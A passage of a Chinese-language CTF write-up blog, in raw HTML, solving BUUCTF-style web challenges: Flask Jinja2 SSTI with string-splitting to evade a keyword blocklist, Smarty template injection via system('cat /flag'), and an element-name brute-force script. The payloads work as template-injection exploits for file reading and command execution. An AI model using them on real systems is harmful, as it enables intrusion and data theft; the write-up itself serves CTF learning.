class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span><span class="token operator">%</span> endif <span class="token operator">%</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span><span class="token operator">%</span> endfor <span class="token operator">%</span><span class="token punctuation">&#125;</span>编码一下：eyUgZm9yIGkgaW4gW10uX19jbGFzc19fLl9fYmFzZV9fLl9fc3ViY2xhc3Nlc19fKCkgJX17JSBpZiBpLl9fbmFtZV9fPT0nY2F0Y2hfd2FybmluZ3MnICV9e3sgaS5fX2luaXRfXy5fX2dsb2JhbHNfX1snX19idWlsdGluc19fJ10ub3BlbignYXBwLnB5JywncicpLnJlYWQoKSB9fXslIGVuZGlmICV9eyUgZW5kZm9yICV9<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>成功读取到了源码：</p><p><img src="https://gitee.com/A1andNS/blogimage/raw/master/img/20210420000505.png" alt="读取源码"></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask<span class="token keyword">import</span> Flask<span class="token punctuation">,</span> render_template_string <span class="token keyword">from</span> flask<span class="token keyword">import</span> render_template<span class="token punctuation">,</span> request<span class="token punctuation">,</span> flash<span class="token punctuation">,</span> redirect<span class="token punctuation">,</span> url_for <span class="token keyword">from</span> flask_wtf<span class="token keyword">import</span> FlaskForm <span class="token keyword">from</span> wtforms<span class="token keyword">import</span> StringField<span class="token punctuation">,</span> SubmitField <span class="token keyword">from</span> wtforms<span class="token punctuation">.</span>validators<span class="token keyword">import</span> DataRequired <span class="token keyword">from</span> flask_bootstrap<span class="token keyword">import</span> Bootstrap<span class="token keyword">import</span> base64 app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span> app<span class="token punctuation">.</span>config<span class="token punctuation">[</span><span class="token string">'SECRET_KEY'</span><span class="token punctuation">]</span> <span class="token operator">=</span><span class="token string">'s_e_c_r_e_t_k_e_y'</span>bootstrap <span class="token operator">=</span> Bootstrap<span class="token punctuation">(</span>app<span class="token punctuation">)</span> <span class="token keyword">class</span> <span class="token class-name">NameForm</span><span class="token punctuation">(</span>FlaskForm<span class="token punctuation">)</span><span class="token punctuation">:</span>     text <span class="token operator">=</span> StringField<span class="token punctuation">(</span><span class="token string">'BASE64 Æ'</span><span class="token punctuation">,</span> validators <span class="token operator">=</span> <span class="token punctuation">[</span>DataRequired<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>     submit <span class="token operator">=</span> SubmitField<span class="token punctuation">(</span><span class="token string">'Ð¤'</span><span class="token punctuation">)</span> <span class="token keyword">class</span> <span class="token class-name">NameForm1</span><span class="token punctuation">(</span>FlaskForm<span class="token punctuation">)</span><span class="token punctuation">:</span>     text <span class="token operator">=</span> StringField<span class="token punctuation">(</span><span class="token string">'BASE64ãÆ'</span><span class="token punctuation">,</span> validators <span class="token operator">=</span> <span class="token punctuation">[</span>DataRequired<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>     submit <span class="token operator">=</span> SubmitField<span class="token punctuation">(</span><span class="token string">'Ð¤'</span><span class="token punctuation">)</span> <span class="token keyword">def</span> <span class="token function">waf</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">)</span><span class="token punctuation">:</span>         black_list <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"flag"</span><span class="token punctuation">,</span> <span class="token string">"os"</span><span class="token punctuation">,</span><span class="token string">"system"</span><span class="token punctuation">,</span> <span class="token string">"popen"</span><span class="token punctuation">,</span> <span class="token string">"import"</span><span class="token punctuation">,</span> <span class="token string">"eval"</span><span class="token punctuation">,</span> <span class="token string">"chr"</span><span class="token punctuation">,</span> <span class="token string">"request"</span><span class="token punctuation">,</span><span class="token string">"subprocess"</span><span class="token punctuation">,</span> <span class="token string">"commands"</span><span class="token punctuation">,</span> <span class="token string">"socket"</span><span class="token punctuation">,</span> <span class="token string">"hex"</span><span class="token punctuation">,</span> <span class="token string">"base64"</span><span class="token punctuation">,</span> <span class="token string">"*"</span><span class="token punctuation">,</span> <span class="token string">"?"</span><span class="token punctuation">]</span>        <span class="token keyword">for</span> x <span class="token keyword">in</span> black_list<span class="token punctuation">:</span>             <span class="token keyword">if</span> x <span class="token keyword">in</span> <span class="token builtin">str</span><span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                 <span class="token keyword">return</span> <span class="token number">1</span>@ app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/hint'</span><span class="token punctuation">,</span> methods <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token keyword">def</span> <span class="token function">hint</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>     txt <span class="token operator">=</span> <span class="token string">"1%CKÍ"</span>    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">"hint.html"</span><span class="token punctuation">,</span> txt <span class="token operator">=</span> txt<span class="token punctuation">)</span>@ app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> methods <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'POST'</span><span class="token punctuation">,</span> <span class="token string">'GET'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token keyword">def</span> <span class="token function">encode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>     <span class="token keyword">if</span> request<span class="token punctuation">.</span>values<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'text'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>         text <span class="token operator">=</span> request<span class="token punctuation">.</span>values<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"text"</span><span class="token punctuation">)</span>         text_decode <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>text<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>         tmp <span class="token operator">=</span> <span class="token string">"Ó :&#123;0&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>text_decode<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        res <span class="token operator">=</span> render_template_string<span class="token punctuation">(</span>tmp<span class="token punctuation">)</span>         flash<span class="token punctuation">(</span>tmp<span class="token punctuation">)</span>         <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'encode'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">else</span> <span class="token punctuation">:</span>        text <span class="token operator">=</span> <span class="token string">""</span>        form <span class="token operator">=</span> NameForm<span class="token punctuation">(</span>text<span class="token punctuation">)</span>         <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">"index.html"</span><span class="token punctuation">,</span> form <span class="token operator">=</span> form<span class="token punctuation">,</span> method <span class="token operator">=</span> <span class="token string">" Æ"</span><span class="token punctuation">,</span> img <span class="token operator">=</span> <span class="token string">"flask.png"</span><span class="token punctuation">)</span>@ app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/decode'</span><span class="token punctuation">,</span> methods <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'POST'</span><span class="token punctuation">,</span> <span class="token string">'GET'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token keyword">def</span> <span class="token function">decode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>values<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'text'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        text <span class="token operator">=</span> request<span class="token punctuation">.</span>values<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"text"</span><span class="token punctuation">)</span>        text_decode <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>text<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>         tmp <span class="token operator">=</span> <span class="token string">"Ó  &#123;0&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>text_decode<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>         <span class="token keyword">if</span> waf<span class="token punctuation">(</span>tmp<span class="token punctuation">)</span><span class="token punctuation">:</span>            flash<span class="token punctuation">(</span><span class="token string">"no no no !!"</span><span class="token punctuation">)</span>             <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'decode'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>         res <span class="token operator">=</span> render_template_string<span class="token punctuation">(</span>tmp<span class="token punctuation">)</span>         flash<span class="token punctuation">(</span>res<span class="token punctuation">)</span>         <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'decode'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">else</span> <span class="token punctuation">:</span>        text <span class="token operator">=</span> <span class="token string">""</span>        form <span class="token operator">=</span> NameForm1<span class="token punctuation">(</span>text<span class="token punctuation">)</span>         <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">"index.html"</span><span class="token punctuation">,</span> form <span class="token operator">=</span>form<span class="token punctuation">,</span> method <span class="token operator">=</span> <span class="token string">"ãÆ"</span><span class="token punctuation">,</span> img <span class="token operator">=</span> <span class="token string">"flask1.png"</span><span class="token punctuation">)</span>@ app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/&lt;name>'</span><span class="token punctuation">,</span> methods <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token keyword">def</span> <span class="token function">not_found</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">:</span>     <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">"404.html"</span><span class="token punctuation">,</span> name <span class="token operator">=</span> name<span class="token punctuation">)</span> <span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host <span class="token operator">=</span> <span class="token string">"0.0.0.0"</span><span class="token punctuation">,</span> port <span class="token operator">=</span> <span class="token number">5000</span><span class="token punctuation">,</span> debug <span class="token operator">=</span> <span class="token boolean">True</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这下整到完整的源码了，就是subclasses为什么会无输出，这里看起来没有什么问题，关注一下waf过滤了不少的关键词，但是我们可用使用拼接来绕过限制。</p><pre class="line-numbers language-none"><code class="language-none">&#123;% for i in [].__class__.__base__.__subclasses__() %&#125;&#123;% if i.__name__&#x3D;&#x3D;&#39;catch_warnings&#39; %&#125;&#123;&#123; i.__init__.__globals__[&#39;__builtins__&#39;][&#39;__imp&#39;+&#39;ort__&#39;](&#39;o&#39;+&#39;s&#39;).listdir(&#39;&#x2F;&#39;) &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;编码：eyUgZm9yIGkgaW4gW10uX19jbGFzc19fLl9fYmFzZV9fLl9fc3ViY2xhc3Nlc19fKCkgJX17JSBpZiBpLl9fbmFtZV9fPT0nY2F0Y2hfd2FybmluZ3MnICV9e3sgaS5fX2luaXRfXy5fX2dsb2JhbHNfX1snX19idWlsdGluc19fJ11bJ19faW1wJysnb3J0X18nXSgnbycrJ3MnKS5saXN0ZGlyKCcvJykgfX17JSBlbmRpZiAlfXslIGVuZGZvciAlfQ&#x3D;&#x3D;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://gitee.com/A1andNS/blogimage/raw/master/img/20210420110818.png" alt="根目录下flag文件"></p><p>下面去读一下文件：</p><pre class="line-numbers language-none"><code class="language-none">&#123;% for i in [].__class__.__base__.__subclasses__() %&#125;&#123;% if i.__name__&#x3D;&#x3D;&#39;catch_warnings&#39; %&#125;&#123;&#123; i.__init__.__globals__[&#39;__builtins__&#39;].open(&#39;&#x2F;this_is_the_fla&#39;+&#39;g.txt&#39;).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;编码：eyUgZm9yIGkgaW4gW10uX19jbGFzc19fLl9fYmFzZV9fLl9fc3ViY2xhc3Nlc19fKCkgJX17JSBpZiBpLl9fbmFtZV9fPT0nY2F0Y2hfd2FybmluZ3MnICV9e3sgaS5fX2luaXRfXy5fX2dsb2JhbHNfX1snX19idWlsdGluc19fJ10ub3BlbignL3RoaXNfaXNfdGhlX2ZsYScrJ2cudHh0JykucmVhZCgpIH19eyUgZW5kaWYgJX17JSBlbmRmb3IgJX0&#x3D;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://gitee.com/A1andNS/blogimage/raw/master/img/20210420111625.png" alt="flag"></p><h2 id="CISCN2019-华东南赛区-Web11"><a href="#CISCN2019-华东南赛区-Web11" class="headerlink" title="[CISCN2019 华东南赛区]Web11"></a>[CISCN2019 华东南赛区]Web11</h2><p>考点：smarty模板注入</p><p>给了一个获取IP的API，首先发现xxf是可以改变页面显示的IP地址的，而且题目告知使用smarty模板引擎，那么考虑xxf处是否存在smarty模板注入的可能。对于smarty模板，可以使用<code>&#123;$smarty.version&#125;</code>来获取smarty版本号是什么,<code>&#123;$smarty.template&#125;</code>来获取当前模板文件名。</p><p><img src="https://gitee.com/A1andNS/blogimage/raw/master/img/20210420115512.png" alt="查询成功"></p><p>这里成功看到了版本是3.1.30，模板文件名4d67881ea3ebdc31c22ffd36520512c179efab6a，可以确定这里就是一个注入点了，去看一下smarty 3的官方手册吧，smarty也不是太熟悉。也看了一篇简单的使用教程<a href="https://www.cnblogs.com/hehheai/p/6509720.html%EF%BC%8C%E7%BF%BB%E8%AF%91%E7%9A%84smarty3%E6%89%8B%E5%86%8Chttps://www.kancloud.cn/prothes/smarty%EF%BC%8C%60%7Bphp%7D%60%E6%A0%87%E7%AD%BE%E8%A2%AB%E7%A6%81%E7%94%A8%E4%BA%86%EF%BC%8C">https://www.cnblogs.com/hehheai/p/6509720.html，翻译的smarty3手册https://www.kancloud.cn/prothes/smarty，`{php}`标签被禁用了，</a></p><p><img src="https://gitee.com/A1andNS/blogimage/raw/master/img/20210420123912.png" alt="php标签被禁用"></p><p>好在smarty中if标签是可以用来执行php代码的。</p><p>直接用</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token punctuation">&#123;</span><span class="token keyword">if</span> <span class="token function">system</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'cat /flag'</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span><span class="token operator">/</span><span class="token keyword">if</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>来读取flag</p><p><img src="https://gitee.com/A1andNS/blogimage/raw/master/img/20210420123553.png" alt="读flag"></p><p>这里既然看了手册就再多探索几种payload：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment">//变量赋值的方式来执行代码</span><span class="token punctuation">&#123;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token function">system</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'cat /flag'</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span><span class="token variable">$a</span><span class="token punctuation">&#125;</span><span class="token comment">//使用追加方式来执行代码</span><span class="token punctuation">&#123;</span>append <span class="token keyword">var</span> <span class="token operator">=</span> <span class="token function">system</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'cat /flag'</span><span class="token punctuation">)</span> value<span class="token operator">=</span><span class="token string single-quoted-string">'1'</span> index<span class="token operator">=</span><span class="token string single-quoted-string">'0'</span><span class="token punctuation">&#125;</span><span class="token comment">//赋值方式来执行代码</span><span class="token punctuation">&#123;</span>assign <span class="token keyword">var</span> <span class="token operator">=</span> <span class="token function">system</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'cat /flag'</span><span class="token punctuation">)</span> value<span class="token operator">=</span><span class="token string single-quoted-string">'1'</span><span class="token punctuation">&#125;</span><span class="token comment">//使用块方式来执行代码</span><span class="token punctuation">&#123;</span>block name <span class="token operator">=</span> <span class="token function">system</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'cat /flag'</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span><span class="token operator">/</span>block<span class="token punctuation">&#125;</span><span class="token comment">//for方式执行代码</span><span class="token punctuation">&#123;</span><span class="token keyword">for</span> <span class="token variable">$name</span><span class="token operator">=</span><span class="token function">system</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'cat /flag'</span><span class="token punctuation">)</span> to <span class="token number">3</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span><span class="token variable">$name</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span><span class="token operator">/</span><span class="token keyword">for</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>看来smarty能够和模板进行接触的点还是很多的，记个小笔记。</p><h2 id="BJDCTF-2nd-elementmaster"><a href="#BJDCTF-2nd-elementmaster" class="headerlink" title="[BJDCTF 2nd]elementmaster"></a>[BJDCTF 2nd]elementmaster</h2><p><strong>考点：脑洞、脚本编写</strong></p><p>开局一张图，什么都没有，扫描了目录依旧一无所有，甚至把图下到了本地以为是图中有玄机，但是似乎没有，看看前段源码，这两个句子倒是有点导向作用，但是还是让我想了很久，关注到id，但是搜索一下发现style里面根本就没有这两个ID的存在，十分可疑啊。</p><p><img src="https://gitee.com/A1andNS/blogimage/raw/master/img/20210421204356.png" alt="源码"></p><p>这两个是16进制的，尝试把他转成字符。</p><p>一个是<code>Po.</code>，另一个是<code>php</code>，正是脑洞啊，正好得到了Po.php，访问看看是什么。Po.php输出只有一个<code>.</code>卡题了，卡了很久，脑洞不够用了，后来看了wp，发现居然是化学元素Po，5555，化学菜鸡流泪。</p><p>这下整明白了，随便找几个元素试试，发现并不是所有的元素都可用访问，那就自己写一个脚本来跑一下看看那些正常吧。</p><p><img src="https://gitee.com/A1andNS/blogimage/raw/master/img/20210421212356.png"></p><p>发现好像可用跑出一个文件名来，稍微改改脚本</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> timepoc <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'H'</span><span class="token punctuation">,</span> <span class="token string">'He'</span><span class="token punctuation">,</span> <span class="token string">'Li'</span><span class="token punctuation">,</span> <span class="token string">'Be'</span><span class="token punctuation">,</span> <span class="token string">'B'</span><span class="token punctuation">,</span> <span class="token string">'C'</span><span class="token punctuation">,</span> <span class="token string">'N'</span><span class="token punctuation">,</span> <span class="token string">'O'</span><span class="token punctuation">,</span> <span class="token string">'F'</span><span class="token punctuation">,</span> <span class="token string">'Ne'</span><span class="token punctuation">,</span> <span class="token string">'Na'</span><span class="token punctuation">,</span> <span class="token string">'Mg'</span><span class="token punctuation">,</span> <span class="token string">'Al'</span><span class="token punctuation">,</span> <span class="token string">'Si'</span><span class="token punctuation">,</span> <span class="token string">'P'</span><span class="token punctuation">,</span> <span class="token string">'S'</span><span class="token punctuation">,</span> <span class="token string">'Cl'</span><span class="token punctuation">,</span> <span class="token string">'Ar'</span><span class="token punctuation">,</span>        <span class="token string">'K'</span><span class="token punctuation">,</span> <span class="token string">'Ca'</span><span class="token punctuation">,</span> <span class="token string">'Sc'</span><span class="token punctuation">,</span> <span class="token string">'Ti'</span><span class="token punctuation">,</span> <span class="token string">'V'</span><span class="token punctuation">,</span> <span class="token string">'Cr'</span><span class="token punctuation">,</span> <span class="token string">'Mn'</span><span class="token punctuation">,</span> <span class="token string">'Fe'</span><span class="token punctuation">,</span> <span class="token string">'Co'</span><span class="token punctuation">,</span> <span class="token string">'Ni'</span><span class="token punctuation">,</span> <span class="token string">'Cu'</span><span class="token punctuation">,</span> <span class="token string">'Zn'</span><span class="token punctuation">,</span> <span class="token string">'Ga'</span><span class="token punctuation">,</span> <span class="token string">'Ge'</span><span class="token punctuation">,</span> <span class="token string">'As'</span><span class="token punctuation">,</span> <span class="token string">'Se'</span><span class="token punctuation">,</span> <span class="token string">'Br'</span><span class="token punctuation">,</span>        <span class="token string">'Kr'</span><span class="token punctuation">,</span> <span class="token string">'Rb'</span><span class="token punctuation">,</span> <span class="token string">'Sr'</span><span class="token punctuation">,</span> <span class="token string">'Y'</span><span class="token punctuation">,</span> <span class="token string">'Zr'</span><span class="token punctuation">,</span> <span class="token string">'Nb'</span><span class="token punctuation">,</span> <span class="token string">'Mo'</span><span class="token punctuation">,</span> <span class="token string">'Te'</span><span class="token punctuation">,</span> <span class="token string">'Ru'</span><span class="token punctuation">,</span> <span class="token string">'Rh'</span><span class="token punctuation">,</span> <span class="token string">'Pd'</span><span class="token punctuation">,</span> <span class="token string">'Ag'</span><span class="token punctuation">,</span> <span class="token string">'Cd'</span><span class="token punctuation">,</span> <span class="token string">'In'</span><span class="token punctuation">,</span> <span class="token string">'Sn'</span><span class="token punctuation">,</span> <span class="token string">'Sb'</span><span class="token punctuation">,</span> <span class="token string">'Te'</span><span class="token punctuation">,</span>        <span class="token string">'I'</span><span class="token punctuation">,</span> <span class="token string">'Xe'</span><span class="token punctuation">,</span> <span class="token string">'Cs'</span><span class="token punctuation">,</span> <span class="token string">'Ba'</span><span class="token punctuation">,</span> <span class="token string">'La'</span><span class="token punctuation">,</span> <span class="token string">'Ce'</span><span class="token punctuation">,</span> <span class="token string">'Pr'</span><span class="token punctuation">,</span> <span class="token string">'Nd'</span><span class="token punctuation">,</span> <span class="token string">'Pm'</span><span class="token punctuation">,</span> <span class="token string">'Sm'</span><span class="token punctuation">,</span> <span class="token string">'Eu'</span><span class="token punctuation">,</span> <span class="token string">'Gd'</span><span class="token punctuation">,</span> <span class="token string">'Tb'</span><span class="token punctuation">,</span> <span class="token string">'Dy'</span><span class="token punctuation">,</span> <span class="token string">'Ho'</span><span class="token punctuation">,</span> <span class="token string">'Er'</span><span class="token punctuation">,</span> <span class="token string">'Tm'</span><span class="token punctuation">,</span>        <span class="token string">'Yb'</span><span class="token punctuation">,</span> <span class="token string">'Lu'</span><span class="token punctuation">,</span> <span class="token string">'Hf'</span><span class="token punctuation">,</span> <span class="token string">'Ta'</span><span class="token punctuation">,</span> <span class="token string">'W'</span><span class="token punctuation">,</span> <span class="token string">'Re'</span><span class="token punctuation">,</span> <span class="token string">'Os'</span><span class="token punctuation">,</span> <span class="token string">'Ir'</span><span class="token punctuation">,</span> <span class="token string">'Pt'</span><span class="token punctuation">,</span> <span class="token string">'Au'</span><span class="token punctuation">,</span> <span class="token string">'Hg'</span><span class="token punctuation">,</span> <span class="token string">'Tl'</span><span class="token punctuation">,</span> <span class="token string">'Pb'</span><span class="token punctuation">,</span> <span class="token string">'Bi'</span><span class="token punctuation">,</span> <span class="token string">'Po'</span><span class="token punctuation">,</span> <span class="token string">'At'</span><span class="token punctuation">,</span> <span class="token string">'Rn'</span><span class="token punctuation">,</span>        <span class="token string">'Fr'</span><span class="token punctuation">,</span> <span class="token string">'Ra'</span><span class="token punctuation">,</span> <span class="token string">'Ac'</span><span class="token punctuation">,</span> <span class="token string">'Th'</span><span class="token punctuation">,</span> <span class="token string">'Pa'</span><span class="token punctuation">,</span> <span class="token string">'U'</span><span class="token punctuation">,</span> <span class="token string">'Np'</span><span class="token punctuation">,</span> <span class="token string">'Pu'</span><span class="token punctuation">,</span> <span class="token string">'Am'</span><span class="token punctuation">,</span> <span class="token string">'Cm'</span><span class="token punctuation">,</span> <span class="token string">'Bk'</span><span class="token punctuation">,</span> <span class="token string">'Cf'</span><span class="token punctuation">,</span> <span class="token string">'Es'</span><span class="token punctuation">,</span> <span class="token string">'Fm'</span><span class="token punctuation">,</span><span class="token string">'Md'</span><span class="token punctuation">,</span> <span class="token string">'No'</span><span class="token punctuation">,</span> <span class="token string">'Lr'</span><span class="token punctuation">,</span>        <span class="token string">'Rf'</span><span class="token punctuation">,</span> <span class="token string">'Db'</span><span class="token punctuation">,</span> <span class="token string">'Sg'</span><span class="token punctuation">,</span> <span class="token string">'Bh'</span><span class="token punctuation">,</span> <span class="token string">'Hs'</span><span class="token punctuation">,</span> <span class="token string">'Mt'</span><span class="token punctuation">,</span> <span class="token string">'Ds'</span><span class="token punctuation">,</span> <span class="token string">'Rg'</span><span class="token punctuation">,</span> <span class="token string">'Cn'</span><span class="token punctuation">,</span> <span class="token string">'Nh'</span><span class="token punctuation">,</span> <span class="token string">'Fl'</span><span class="token punctuation">,</span> <span class="token string">'Mc'</span><span class="token punctuation">,</span> <span class="token string">'Lv'</span><span class="token punctuation">,</span> <span class="token string">'Ts'</span><span class="token punctuation">,</span> <span class="token string">'Og'</span><span class="token punctuation">,</span> <span class="token string">'Uue'</span><span class="token punctuation">]</span>url <span class="token operator">=</span> <span class="token string">'http://063ef4ee-3c60-495d-8536-23adff29b397.node3.buuoj.cn/&#123;&#125;.php'</span>flag <span class="token operator">=</span> <span class="token string">''</span><span class="token keyword">for</span> i <span class="token keyword">in</span> poc<span class="token punctuation">:</span>    r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> r<span class="token punctuation">.</span>status_code <span class="token operator">==</span> <span class="token number">200</span><span class="token punctuation">:</span>        flag <span class="token operator">+=</span> r<span class="token punctuation">.</span>text        <span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">"[+]Filename:&#123;0&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">)</span>    time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>[+]Filename:And_th3_3LemEnt5_w1LL_De5tR0y_y0u.php</p><p>访问一下</p><p><img src="https://gitee.com/A1andNS/blogimage/raw/master/img/20210421213916.png" alt="flag"></p><p>这题从难度上来说应该是很简单，但是脑洞我是真的开不动啊。</p><h2 id="BJDCTF-2nd-Schrödinger"><a href="#BJDCTF-2nd-Schrödinger" class="headerlink" title="[BJDCTF 2nd]Schrödinger"></a>[BJDCTF 2nd]Schrödinger</h2><p><strong>考点：</strong>脑洞、时间戳</p><p>显示这是一个暴力破解的api网站。</p><p>看一下前段源码，发现提示Note : Remenmber to remove test.php!</p><p><img src="https://gitee.com/A1andNS/blogimage/raw/master/img/20210421220921.png" alt="test.php"></p><p>是一个登录页面，而且似乎需要获取admin密码。以为可以sql啥的整了半天，最后才想起来回到首页来进行爆破试试。但是这个爆破速度也太慢了吧，抓包检查一下。</p><p><img src="https://gitee.com/A1andNS/blogimage/raw/master/img/20210421222418.png" alt="check"></p><p>解一下url再来个base64发现是一个时间戳1619014885</p><p>那我就去转换一下，发现时当是的时间，那我伪造一个时间戳去传入看看。这个时间戳改大了没有用，直接给我NA%了，那就改小，给他设置为空值。就到了99%了</p><p><img src="https://gitee.com/A1andNS/blogimage/raw/master/img/20210421224329.png" alt="解密进度"></p><p>在时间戳为空时check一下，得到了信息。</p><p><img src="https://gitee.com/A1andNS/blogimage/raw/master/img/20210421225333.png" alt="爆破结果"></p><p>很可惜登录还是失败了，这里又是一个脑洞的地方，av11664517是不是很熟悉，如果经常逛B站应该就会认出它，然而我还是没有缓过神来。</p><p>然后这flag在评论区里面。。。脑洞无处不在。</p><p>BJD{Quantum_Mechanics_really_Ez}</p><h2 id="BJDCTF-2nd-老文盲了"><a href="#BJDCTF-2nd-老文盲了" class="headerlink" title="[BJDCTF 2nd]老文盲了"></a>[BJDCTF 2nd]老文盲了</h2><p><strong>考点：生僻字拼音</strong></p><p>文盲是什么，当然是不认识字，不认识字的最直接表象就是不会读。那么就用<a href="https://pinyin.supfree.net/%E5%9C%A8%E7%BA%BF%E6%B1%89%E5%AD%97%E8%BD%AC%E6%8B%BC%E9%9F%B3%E7%9A%84%E6%93%8D%E4%BD%9C%E3%80%82">https://pinyin.supfree.net/在线汉字转拼音的操作。</a></p><p>然后读出flag：</p><pre 